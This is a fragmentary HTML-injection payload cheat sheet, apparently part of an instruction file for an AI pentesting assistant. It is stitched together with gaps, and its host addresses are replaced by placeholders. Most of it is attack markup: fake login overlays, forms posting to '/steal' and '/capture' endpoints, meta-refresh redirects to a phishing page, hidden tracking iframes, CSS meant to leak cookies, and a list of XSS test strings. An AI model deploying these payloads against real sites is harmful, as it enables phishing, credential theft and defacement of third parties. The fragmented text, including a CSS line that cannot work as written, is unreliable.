...
Ask the user to verify the target URL/IP before running any commands.
...
<!-- Links -->
<a href="[SAFE-PAYLOAD]">Click Here</a>
<a href="[SAFE-PAYLOAD]">Legitimate Link</a>

<!-- Images -->
<img src="[SAFE-PAYLOAD]/image.png">
...
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     ...
     <p>Please login at <a href="[SAFE-PAYLOAD]/login">portal.company.com</a></p>
     </div>

<!-- Comment injection -->
Great article!
<form action="[SAFE-PAYLOAD]/steal" method="POST">
...
```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="[SAFE-PAYLOAD]/steal">
...
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
    ...
    <form action="[SAFE-PAYLOAD]/capture" method="POST">
...
<style>
    input { background: url('[SAFE-PAYLOAD]/log?data=') }
</style>
<form action="[SAFE-PAYLOAD]/steal" method="POST">
...
<!-- Image injection -->
<img src="[SAFE-PAYLOAD]/defaced.jpg"
...
<!-- Style injection -->
<style>
    body { background: url('[SAFE-PAYLOAD]/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('[SAFE-PAYLOAD]/log')">Content</div>
```
...
<meta http-equiv="refresh" content="0;url=[SAFE-PAYLOAD]/phish">
...
<form action="[SAFE-PAYLOAD]/steal">
...
<iframe src="[SAFE-PAYLOAD]/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="[SAFE-PAYLOAD]/track" style="display:none"></iframe>
```
...
payloads = [
    ...
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='[SAFE-PAYLOAD]'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='[SAFE-PAYLOAD]'></iframe>",
]
